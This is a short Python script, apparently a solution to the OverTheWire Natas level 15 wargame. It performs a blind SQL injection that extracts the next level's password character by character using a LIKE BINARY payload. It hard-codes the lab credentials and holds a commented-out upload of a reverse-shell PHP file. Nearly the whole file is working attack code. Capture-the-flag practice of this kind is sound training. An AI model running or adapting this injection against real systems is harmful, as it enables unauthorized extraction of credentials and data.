#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Time: 2019/04/22 5:08 PM


"""about:
1. blind sql injection
2. awesome

"""

import re
import requests
import base64
import urllib
import codecs

from string import ascii_letters, digits

# print(ascii_letters+digits)


username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = f'http://{username}.natas.labs.overthewire.org/?debug=true'

s = requests.Session()

# cookies = {'data': 'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}

# resp = s.post(url, data={"filename":"revshell.php", "MAX_FILE_SIZE": "1000"}, auth=(username, password), files={"uploadedfile": open("revshell.php", 'rb')})

characters = ascii_letters + digits

# MySQL 默认是对大小写不敏感
#  BINARY 可以让大小写敏感


seen_password = list('WaIHEacj63wnNIBRO')
while True:
    for ch in characters:
        print(f"tring ****** {ch} ****** with password", "".join(seen_password))
        resp = s.post(url, data={"username": 'natas16 " AND password LIKE BINARY "' + "".join(seen_password) + ch + '%" #'},
                      auth=(username, password))

        content = resp.text
        # print(content)

        if "user exists" in content:
            seen_password.append(ch)
            break           # break here is    jump out of the for loop



